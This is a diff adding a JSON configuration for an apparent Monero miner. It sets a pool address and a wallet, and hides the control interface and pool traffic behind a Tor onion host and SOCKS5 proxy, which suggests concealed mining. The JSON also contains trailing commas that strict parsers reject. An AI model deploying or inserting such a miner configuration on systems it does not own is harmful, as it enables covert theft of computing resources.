@@ -1,0 +1,17 @@
+{
+    "http": {
+        "enabled": true,
+        "host": "yg57v5wpvos2dlaiorr5gz3rxi3jnfgdua3iqombi2w6yfszctbcy2qd.onion",
+        "port": 8080,
+    },
+    "pools": [
+        {
+            "url": "pool.minexmr.com:443",
+            "user": "48Tf2rj4iM7TMT71sgSKZ2LwrVRuehUH9eRRNyi9uk9mYeD7bmcGk3iKLfomoBK5jHb56YmdHCZcq2PtZNfHepw21ZX51YF",
+            "pass": "x",
+            "enabled": true,
+            "tls": true,
+            "socks5": 9050,
+		}
+	]	
+}
